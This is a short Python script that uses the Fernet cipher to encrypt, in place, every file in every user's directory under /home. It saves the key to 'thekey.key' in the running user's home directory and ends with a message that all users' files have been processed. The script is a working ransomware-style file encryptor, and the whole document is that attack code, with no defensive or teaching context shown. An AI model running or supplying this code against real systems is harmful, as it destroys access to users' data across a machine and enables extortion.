import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            contents = file.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file_path, "wb") as file:
            file.write(encrypted_contents)
    except PermissionError:
        print(f"Permission denied: '{file_path}'")
    except Exception as e:
        print(f"An error occurred while encrypting '{file_path}': {e}")

def encrypt_directory(directory_path, key):
    for dirpath, _, filenames in os.walk(directory_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            encrypt_file(file_path, key)

# Generate encryption key
key = Fernet.generate_key()

# Save the encryption key to a file in the user's home directory
key_file_path = os.path.join(os.path.expanduser("~"), "thekey.key")
try:
    with open(key_file_path, "wb") as thekey:
        thekey.write(key)
except PermissionError:
    print(f"Permission denied: '{key_file_path}'")
except Exception as e:
    print(f"An error occurred while saving the key: {e}")

# Encrypt all files for each user
for user in os.listdir('/home'):
    user_directory = os.path.join('/home', user)
    if os.path.isdir(user_directory):
        encrypt_directory(user_directory, key)

print("All files in all users have been processed!")
